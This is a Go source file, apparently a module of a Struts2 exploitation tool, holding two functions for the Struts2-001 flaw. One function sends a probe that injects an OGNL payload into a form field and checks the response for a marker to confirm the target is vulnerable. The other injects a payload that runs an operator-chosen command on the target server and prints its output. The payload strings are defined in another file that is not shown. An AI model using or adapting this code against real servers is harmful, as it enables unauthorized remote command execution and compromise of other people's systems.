package s001

import (
	"ST2G/cvemod/x51utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)
func Check(targeturl string,postData string) {
	client := &http.Client{
		Timeout:x51utils.Timeout,
	}
	postData = strings.Replace(postData,"fuckit",x51utils.POC_s001_check,1)
	req, err := http.NewRequest("POST", targeturl,strings.NewReader(postData) )
	req.Header.Set("User-Agent", x51utils.GlobalUserAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	response, _ := client.Do(req)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	isVulnable := strings.Contains(respBody, "6308")
	if isVulnable {
		x51utils.Colorlog("Found Struts2-001!")

	} else {
		fmt.Println("Struts2-001 Not Vulnerable.")
	}
}
func ExecCommand(targeturl string,command string,postData string){
	client := &http.Client{
		Timeout:x51utils.Timeout,
	}
	postData = strings.Replace(postData,"fuckit",x51utils.POC_s001_exec(command),1)
	req, err := http.NewRequest("POST", targeturl,strings.NewReader(postData) )
	req.Header.Set("User-Agent", x51utils.GlobalUserAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; param=value")
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	response, _ := client.Do(req)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	x51struts2commandout := strings.Index(respBody,"x51struts2commandout")
	fmt.Println(respBody[x51struts2commandout+20:])
}